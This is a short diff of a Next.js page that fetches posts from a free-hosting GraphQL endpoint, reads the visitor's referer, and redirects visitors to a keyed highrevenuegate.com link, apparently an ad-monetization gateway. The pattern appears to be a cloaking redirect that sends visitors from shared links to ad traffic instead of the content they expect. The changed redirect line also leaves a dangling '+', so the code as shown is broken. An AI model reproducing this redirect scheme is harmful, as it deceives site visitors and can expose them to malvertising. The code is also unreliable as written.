@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = " https://ruttu.000webhostapp.com/graphql"
+	const endpoint = "https://ruttu.000webhostapp.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					` https://www.highrevenuegate.com/qtg4dabx?key=f9fb1a9e527392ef993285934f362319` 
+					`https://www.highrevenuegate.com/qtg4dabx?key=f9fb1a9e527392ef993285934f362319/` + 
 				}`,
 			},
 		};
